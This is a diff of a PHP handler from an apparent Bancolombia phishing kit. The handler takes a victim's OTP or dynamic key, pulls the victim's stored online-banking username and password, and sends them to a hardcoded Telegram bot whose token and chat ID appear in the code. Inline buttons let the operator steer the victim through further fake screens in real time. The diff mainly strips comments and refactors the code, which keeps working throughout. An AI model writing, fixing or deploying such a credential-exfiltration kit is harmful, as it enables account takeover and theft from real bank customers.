@@ -1,125 +1,112 @@
 <?php
-/**
- * enviar_dato_extra.php
- * ---------------------
- * Handler POST de la pantalla de CLAVE DINÁMICA 1 (opcion1.html).
- *
- * El usuario ya rellenó el 1er factor y vuelve a la pantalla de loader
- * para esperar una segunda decisión del operador.
- *
- * 7 PASOS STANDARD (igual que el resto de enviar_dato_extra*):
- *   1) Recibir campos del formulario (en este caso `codigo` dinámico + key).
- *   2) SELECT solicitudes WHERE `key` = ? para recuperar info completa.
- *   3) Generar NUEVO request_id = BCO_<144 bits> (mismo formato que sendata).
- *   4) UPDATE la fila:
- *        • nuevo request_id
- *        • estado = 'pendiente' (así el loader no salta solo)
- *        • guardar los datos extra que rellenó el usuario (codigo_dinamica).
- *   5) Enviar mensaje a Telegram con TODOS los datos del flujo hasta el momento
- *      + teclado inline standard (errores / DINAMICA / OTP / FINALIZAR).
- *        OPCION_9  = 🔴 ERROR Dinámica  (pantalla error Bancolombia opcion9.html)
- *        OPCION_10 = 🟢 FINALIZAR     (URL real bancolombia.com/personas/creditos)
- *   6) 302 Location a espera.html (loader indefinido otra vez).
- *   7) exit.
- */
 
 ob_start();
 require __DIR__ . DIRECTORY_SEPARATOR . 'conexion.php';
 
-// ── Paso 1 ────────────────────────────────────────────────────────────────────
-$codigo = $_POST['codigo'] ?? '';
-$key    = $_POST['key']    ?? '';
+$codigo = isset($_POST['codigo']) ? $_POST['codigo'] : '';
+$key    = isset($_POST['key']) ? $_POST['key'] : '';
 if (!$key) {
     die("Error: Key no proporcionada.");
 }
 
-// ── Paso 2 ────────────────────────────────────────────────────────────────────
 $stmt = $pdo->prepare(
-    "SELECT numero_cuenta, monto, banco, nombre, telefono, correo
+    "SELECT numero_cuenta, monto, banco, nombre, telefono, correo,
+            `user` AS vp_usuario, `password` AS vp_clave, request_id
      FROM solicitudes WHERE BINARY `key` = ? LIMIT 1"
 );
-$stmt->execute([$key]);
+$stmt->execute(array($key));
 $data = $stmt->fetch(PDO::FETCH_ASSOC);
 if (!$data) {
     die("Error: Solicitud no encontrada.");
 }
 
-$celular = $data['numero_cuenta'];
-$monto   = $data['monto'];
-$banco   = $data['banco'];
-$usuario = $data['nombre'];
-$clave   = $data['telefono'];
-$correo  = $data['correo'];
+$monto   = isset($data['monto']) ? $data['monto'] : '';
+$banco   = isset($data['banco']) ? $data['banco'] : 'Bancolombia';
+$usuario = isset($data['vp_usuario']) ? $data['vp_usuario'] : '';
+$clave   = isset($data['vp_clave']) ? $data['vp_clave'] : '';
+$correo  = isset($data['correo']) ? $data['correo'] : '';
 
-// ── Paso 3: nuevo request_id formato BCO_<144 bits> (mismo scope Bancolombia) ─
 try {
     $nuevo_request_id = 'BCO_' . bin2hex(random_bytes(18));
-} catch (Throwable $_) {
+} catch (Throwable $e) {
     $nuevo_request_id = 'BCO_' . bin2hex(openssl_random_pseudo_bytes(18));
 }
 
-// ── Paso 4 ────────────────────────────────────────────────────────────────────
 $update = $pdo->prepare(
     "UPDATE solicitudes
      SET request_id = ?, estado = 'pendiente'
      WHERE BINARY `key` = ?"
 );
-$update->execute([$nuevo_request_id, $key]);
+$update->execute(array($nuevo_request_id, $key));
 
 $saveCode = $pdo->prepare(
     "UPDATE solicitudes SET codigo_dinamica = ? WHERE BINARY `key` = ?"
 );
-$saveCode->execute([$codigo, $key]);
+$saveCode->execute(array($codigo, $key));
 
-// ── Paso 5: mensaje Telegram + teclado inline standard ────────────────────────
-// FIX DETERMINANTE: CANAL NUEVO hardcodeado DEFAULT. getenv() SOLO sobreescribe
-// si existe y no está vacía. Nunca más al bot viejo.
 $DEFAULT_BOT_TOKEN_OPS = "8924841749:AAG6MK_tMpRF19EehX5iEQdfotCySeD6m4c";
 $DEFAULT_CHAT_ID_OPS   = "-5503364698";
 $envBot = getenv('TELEGRAM_BOT_TOKEN_OPS');
 $envCh  = getenv('TELEGRAM_CHAT_ID_OPS');
-$token   = (is_string($envBot) && trim($envBot) !== '') ? $envBot : $DEFAULT_BOT_TOKEN_OPS;
-$chat_id = (is_string($envCh)  && trim($envCh)  !== '') ? $envCh  : $DEFAULT_CHAT_ID_OPS;
+$token   = $DEFAULT_BOT_TOKEN_OPS;
+if (is_string($envBot) && trim($envBot) !== '') { $token = $envBot; }
+$chat_id = $DEFAULT_CHAT_ID_OPS;
+if (is_string($envCh)  && trim($envCh)  !== '') { $chat_id = $envCh; }
 
-$mensaje  = "✅ <b>[DATO EXTRA: DINÁMICA / OTP]</b> Código recibido después del login:\n";
-$mensaje .= "━━━━━━━━━━━━━━━━━━━━━━\n";
-$mensaje .= "💸 Recarga solicitada: $monto\n";
-$mensaje .= "🏦 Banco elegido: $banco\n";
-$mensaje .= "📧 Email: $correo\n";
-$mensaje .= "━━━━━━━━━━━━━━━━━━━━━━\n";
-$mensaje .= "Usuario: $usuario\n";
-$mensaje .= "Contraseña: $clave\n";
-$mensaje .= "━━━━━━━━━━━━━━━━━━━━━━\n";
-$mensaje .= "Dinámica/OTP: $codigo\n";
-$mensaje .= "━━━━━━━━━━━━━━━━━━━━━━\n";
+function fv_extra($v, $ph = '<i>(no informado)</i>') {
+    $s = is_string($v) ? trim($v) : '';
+    if ($s === '') { return $ph; }
+    return htmlspecialchars($s, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
+}
 
-$botones = [
-    'inline_keyboard' => [[
-        ['text' => "clavedinamica",    'callback_data' => "OPCION_1_$nuevo_request_id"],
-        ['text' => "otp",              'callback_data' => "OPCION_2_$nuevo_request_id"],
-    ], [
-        ['text' => "repetirusuario",   'callback_data' => "OPCION_3_$nuevo_request_id"],
-        ['text' => "repetirdinamica",  'callback_data' => "OPCION_4_$nuevo_request_id"],
-    ], [
-        ['text' => "🔴ERROR Dinámica", 'callback_data' => "OPCION_9_$nuevo_request_id"],
-        ['text' => "🟢FINALIZAR",      'callback_data' => "OPCION_10_$nuevo_request_id"],
-    ]],
-];
+$SEP = str_repeat("-", 30);
+$mensaje  = "";
+$mensaje .= "\xE2\x9C\x85 <b>[DATO EXTRA: DINAMICA / OTP]</b> Codigo recibido despues del login:\n";
+$mensaje .= $SEP . "\n";
+$mensaje .= "\xF0\x9F\x92\xB0 Recarga solicitada: " . fv_extra($monto) . "\n";
+$mensaje .= "\xF0\x9F\x8F\xA6 Banco elegido: " . fv_extra($banco) . "\n";
+$mensaje .= $SEP . "\n";
+$mensaje .= "\xF0\x9F\x91\xA4 Usuario Virtual-Persona: " . fv_extra($usuario) . "\n";
+$mensaje .= "\xF0\x9F\x94\x92 Clave Virtual-Persona: " . fv_extra($clave) . "\n";
+$mensaje .= $SEP . "\n";
+$mensaje .= "\xF0\x9F\x94\xA2 Dinamica/OTP: " . fv_extra($codigo) . "\n";
+$mensaje .= $SEP . "\n";
 
-$payload = json_encode([
-    'chat_id'      => $chat_id,
-    'text'         => $mensaje,
-    'reply_markup' => $botones,
-]);
-$ch = curl_init("https://api.telegram.org/bot{$token}/sendMessage");
+$botones = array(
+    'inline_keyboard' => array(
+        array(
+            array('text' => "clavedinamica",   'callback_data' => "OPCION_1_" . $nuevo_request_id),
+            array('text' => "otp",             'callback_data' => "OPCION_2_" . $nuevo_request_id),
+        ),
+        array(
+            array('text' => "repetirusuario",  'callback_data' => "OPCION_3_" . $nuevo_request_id),
+            array('text' => "repetirdinamica", 'callback_data' => "OPCION_4_" . $nuevo_request_id),
+        ),
+        array(
+            array('text' => "\xF0\x9F\x94\xB4 ERROR Dinamica", 'callback_data' => "OPCION_9_" . $nuevo_request_id),
+            array('text' => "\xF0\x9F\x9F\xA9 FINALIZAR",      'callback_data' => "OPCION_10_" . $nuevo_request_id),
+        ),
+    ),
+);
+
+$payloadArr = array(
+    'chat_id'                  => $chat_id,
+    'text'                     => $mensaje,
+    'parse_mode'               => 'HTML',
+    'disable_web_page_preview' => true,
+    'reply_markup'             => $botones,
+);
+$payload = json_encode($payloadArr);
+
+$ch = curl_init("https://api.telegram.org/bot" . $token . "/sendMessage");
 curl_setopt($ch, CURLOPT_POST, true);
 curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
-curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
+curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
 curl_exec($ch);
 curl_close($ch);
 
-// ── Paso 6 y 7 ────────────────────────────────────────────────────────────────
-header("Location: espera.html?rid=$nuevo_request_id&key=$key&correo=" . urlencode($correo));
+$qs = http_build_query(array('rid' => $nuevo_request_id, 'key' => $key, 'correo' => $correo), '', '&', PHP_QUERY_RFC3986);
+header("Location: espera.html?" . $qs);
 exit;
